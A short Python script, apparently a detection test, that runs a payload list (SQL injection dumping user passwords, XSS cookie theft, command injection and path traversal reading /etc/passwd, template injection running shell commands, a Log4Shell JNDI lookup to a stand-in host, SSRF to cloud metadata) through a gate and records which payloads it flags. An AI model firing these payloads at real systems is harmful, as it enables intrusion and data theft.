import sys; sys.path.insert(0, sys.argv[1])
from harness import *
from urllib.parse import quote
def enc(s): return quote(s, safe="")
P = {"sqli": ("/search?q=", "x' UNION SELECT username,password FROM users--"),
     "xss": ("/search?q=", "<script>alert(document.cookie)</script>"),
     "cmdi": ("/ping?host=", "127.0.0.1;cat /etc/passwd"),
     "ssti": ("/hello?name=", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
     "log4shell": ("/hello?name=", "${jndi:ldap://x.example/a}"),
     "traversal": ("/dl?file=", "../../../../etc/passwd"),
     "ssrf": ("/fetch?url=", "http://169.254.169.254/latest/meta-data/"),
}
for prefix in ["token:", "auth:", "pass=", "session:"]:
    row = []
    for k, (base, pay) in P.items():
        t = base + prefix + enc(pay)
        g_ev = gate_event(t); g = web(run([g_ev])[0])
        d = web(run([direct_event(t)])[0])
        row.append(f"{k}:{'D' if d else '-'}/{'G' if g else '-'}")
    print(prefix, " ".join(row))
